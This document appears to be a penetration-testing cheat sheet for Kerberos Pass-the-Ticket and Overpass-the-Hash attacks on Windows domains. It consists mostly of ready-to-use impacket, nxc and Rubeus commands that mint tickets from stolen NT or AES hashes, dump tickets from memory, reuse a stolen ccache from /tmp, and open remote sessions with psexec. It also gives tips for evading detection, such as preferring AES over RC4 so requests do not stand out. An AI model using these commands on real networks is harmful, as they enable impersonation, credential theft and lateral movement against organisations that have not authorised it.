Pass-the-Ticket / Overpass-the-Hash - Cheat Sheet

Authenticate with Kerberos tickets/keys instead of a password.
  - Pass-the-Ticket (PtT): steal an existing TGT/TGS and reuse it.
  - Overpass-the-Hash (OPtH / "pass-the-key"): turn an NT/AES hash into a real
    TGT, then use Kerberos (quieter than NTLM PtH, and works where NTLM is off).
Tools: Rubeus (Windows), impacket (Linux), nxc.
Replace the placeholders (<...>) with your own values.


=== OVERPASS-THE-HASH (hash -> TGT) ===
You have a user's NT or AES hash and want a Kerberos session as them.

Step O1 - Linux (impacket getTGT)

    # with NT (RC4) hash:
    impacket-getTGT <domain>/<user> -hashes :<nt-hash> -dc-ip <dc-ip>
    # with AES256 key (stealthier - matches modern default etype):
    impacket-getTGT <domain>/<user> -aesKey <aes256-key> -dc-ip <dc-ip>

This writes <user>.ccache. Tell tools to use it:

    export KRB5CCNAME=<user>.ccache
    nxc smb <target-fqdn> --use-kcache
    impacket-psexec -k -no-pass <domain>/<user>@<target-fqdn>

Step O2 - Windows (Rubeus)

    Rubeus.exe asktgt /user:<user> /domain:<domain> /rc4:<nt-hash> /ptt
    Rubeus.exe asktgt /user:<user> /domain:<domain> /aes256:<aes-key> /ptt
    # /ptt injects the TGT into the current logon session -> then just use SMB/WinRM


=== PASS-THE-TICKET (reuse a stolen ticket) ===
You already have a .ccache (Linux) or .kirbi (Windows) ticket.

Step P1 - Harvest tickets

    # Windows - dump tickets from memory (admin/SYSTEM):
    Rubeus.exe dump            # all tickets
    Rubeus.exe dump /nowrap    # base64 for easy copy

    # Linux - reuse a found ccache (e.g. from a compromised host /tmp/krb5cc_*)
    cp /tmp/krb5cc_1000 ./stolen.ccache

Step P2 - Inject / use the ticket

    # Windows (Rubeus): inject a base64 .kirbi into the session
    Rubeus.exe ptt /ticket:<base64-kirbi>
    klist                      # confirm it's loaded

    # Linux (impacket): point KRB5CCNAME at it
    export KRB5CCNAME=stolen.ccache
    klist
    impacket-psexec -k -no-pass <domain>/<user>@<target-fqdn>

Step P3 - Convert between formats if needed

    impacket-ticketConverter stolen.kirbi stolen.ccache    # kirbi -> ccache
    impacket-ticketConverter stolen.ccache stolen.kirbi    # ccache -> kirbi


Where tickets come from (combine with other sheets)
  - Overpass-the-hash from a dumped NT/AES hash (LSASS / secretsdump).
  - Rubeus dump / monitor on a host you control (incl. unconstrained delegation).
  - certipy auth / shadow credentials output a ccache.
  - S4U (delegation abuse) outputs a ccache.


PtT / OPtH vs NTLM Pass-the-Hash
  - NTLM PtH uses the NT hash over NTLM directly (see pass-the-hash sheet).
  - OPtH converts the hash to Kerberos first -> blends in as normal Kerberos,
    works when NTLM is disabled, and lets you request further service tickets.
  - Prefer AES keys over RC4/NT where possible - RC4 (etype 23) requests stand
    out in modern, AES-only environments.


(optional) Fix clock skew - Kerberos fails on time drift:
    sudo ntpdate <dc-ip>


Key idea: Kerberos identity lives in tickets and keys, not passwords. If you
hold a user's hash you can mint a fresh TGT (overpass-the-hash); if you hold an
existing ticket you can just replay it (pass-the-ticket). Either way you act as
that user over Kerberos - cleaner than NTLM, resilient to password changes for
the ticket's lifetime, and the glue that lets delegation, ADCS, and shadow-cred
output turn into real access.
